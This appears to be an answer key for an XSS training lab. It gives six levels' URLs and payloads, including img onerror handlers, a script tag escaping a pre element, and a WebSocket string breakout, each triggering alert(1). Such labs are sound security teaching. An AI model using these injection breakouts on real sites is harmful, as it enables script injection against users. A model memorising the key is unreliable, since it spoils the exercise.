# modern — solutions

Modern framework / SaaS XSS shapes: dangerouslySetInnerHTML, markdown, hydration mismatch, etc.

### modern-level1

`/modern/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: input URI-encoded then decoded client-side into innerHTML

### modern-level2

`/modern/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: markdown link text reflected raw; a `)` ends the href, so inject HTML directly

### modern-level3

`/modern/level3/?query=%3C/pre%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</pre><script>alert(1)</script>`
- context: GraphQL error message inside `<pre>` (raw)

### modern-level4

`/modern/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: server encodes angles but client reads raw `location.search` and innerHTMLs it

### modern-level5

`/modern/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: 'query' raw in body (Origin header reflected separately, body XSS is direct)

### modern-level6

`/modern/level6/?wsurl=x');%7Dcatch(e)%7B%7Dalert(1);try%7Bnew%20WebSocket('x`

- payload: `x');}catch(e){}alert(1);try{new WebSocket('x`
- context: inside new WebSocket('...') in a try; close the call and the try/catch, then run
